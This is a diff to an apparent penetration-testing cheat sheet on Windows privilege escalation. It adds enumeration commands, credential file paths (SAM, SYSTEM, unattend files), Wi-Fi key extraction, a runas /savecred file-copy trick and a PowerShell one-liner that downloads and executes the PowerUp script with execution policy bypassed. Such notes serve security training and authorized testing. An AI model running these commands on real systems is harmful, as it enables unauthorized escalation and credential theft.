@@ -12,6 +12,11 @@ We can get a list of users with the following command,
 ```
 C:> net user
 C:> net user (USERNAME)
+C:> whoami /priv
+C:> whoami /all
+C:> net accounts
+C:> net localgroup
+C:> Get-LocalGroup | ft Name
 ```
 ### Network Information
 We can use DOS to gather network information from the comrpomised taregt Microsoft Windows machine with the following DOS commands,
@@ -22,6 +27,15 @@ C:> arp -A
 C:> netstat -ano
 C:> netsh firewall show state
 C:> netsh firewall show config
+C:> netsh advfirewall firewall dump
+C:> net share
+```
+Powershell,
+```
+PS> Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+PS> Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+PS> Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+PS> Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
 ```
 ### Scheduled Tasks
 Micorosft Windows might have scheduled tasks which we can leverge depending on the task, permissions, the files it accesses and their permissions, and how oftne the task runs. Use the followinf DOS command to gather scheduled task information from Microsoft Windows,
@@ -35,7 +49,7 @@ Some drivers might have vulnerabilities. We can list the drivers used on a Micro
 ```
 C:> DRIVERQUERY
 ```
-## Missing Patches
+### Missing Patches
 To get the patch information for Microsoft Windows systems, we can us `wmic` as shown below.
 ```
 C:> wmic qfe get Caption, Description, HotFixID, InstalledOn
@@ -45,26 +59,26 @@ Then do a search in Exploit-DB with `searchsploit` in Kali Linux.
 ## Browser Credentials
 Browser credentials could lead to escalation if the credentials are reused on other systems and services. 
 
-## PowerUp
+### PowerUp
 The [PowerUp Power Shell script](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) PowerSploit module can be used to search for injectable DLLs, service permissions, autologin credentials, web configuration credentials and many other areas of the OS and FS that can be used specifically for privilege escalation.
 
-## AlwaysInstallElevated
+### AlwaysInstallElevated
 This option in the Windows registry will aloow us to execute a binary that does `execv()` and adds an admin user no matter what privilege we current are. This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
 ```
 C:\Windows\system32> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 C:\Windows\system32> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
-## RunAs
+### RunAs
 You can try the `runas` command with the `/savecred` in hopes that an admin credential has been saved for scripting purposes. For instance, spawn a new shell and write the contents of a protected file to one that you can read, like so,
 ```
 C:\> runas /savecred /user:Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\PwnedUser\Desktop\flag.txt"
 ```
 If the credentials are in fact stored, you will get a new file in the pwned user's desktop called "flag.txt"
 
-## WMIC
+### WMIC
 Windows Management Instrumentation Console can sometimes be leveraged for privilege escalation.
 
-## Mass Install of Windows to Labs
+### Mass Install of Windows to Labs
 Sometimes the mass-install process of many Microsoft Windows machines in the same environment can leave behind log files with sensitive information in them. We can check a few of these files if they exist on the file system onthe compromised target Windows machine,
 ```
 c:\sysprep.inf
@@ -72,7 +86,7 @@ c:\sysprep\sysprep.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 %WINDIR%\Panther\Unattended.xml
 ```
-## Groups.xml
+### Groups.xml
 If we have access to the SYSVOL/groups.xml file, we have access to any passwords encrypted in there. When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted. 
 
 Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.
@@ -86,7 +100,7 @@ f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
 ```
 There is a PowerSploit Power Shell script that we can use to automate the password reveal [located here.](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
 
-## Mass Credentials Search
+### Mass Credentials Search
 Below are a few searches that we can do in our DOS prompt for searching for credentials that are stored in files.
 ```
 C:> dir /s *pass* == *cred* == *vnc* == *.config*
@@ -94,7 +108,29 @@ C:> findstr /si password *.xml *.ini *.txt
 C:> reg query HKLM /f password /t REG_SZ /s
 C:> reg query HKCU /f password /t REG_SZ /s
 ```
-## Windows Services
+We can check the following files for credentials
+```
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+```
+Unattend XML Files may contain passwords also,
+```
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+```
+WiFi Passwords
+```
+C:> netsh wlan show profile
+C:> netsh wlan show profile (SSID) key=clear
+```
+### Windows Services
 Next, we can try Microsoft Windows Services with the following command,
 ```
 C:> sc qc Sploiler
@@ -128,7 +164,22 @@ The access rights that we are looking for in the service to fully exploit it are
 * GENERIC_WRITE
 * GENERIC_ALL
 The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting article on the subject.
-## Weak File Permissions
+### Windows Processes
+We can gather information on the currently-running processes with the following commands,
+```
+C:> tasklist /v
+C:> tasklist /v /fi "username eq system"
+C:> net start
+C:> sc query
+PS> Get-Service
+PS> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+PS> REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
+```
+Search for weak services using [PowerUp Power Shell](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps) script,
+```
+powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+```
+### Weak File Permissions
 We can also use `accesschk.exe` to determine which files in the target system have weak permissions like so,
 ```
 C:> accesschk.exe -uwdqs Users c:\
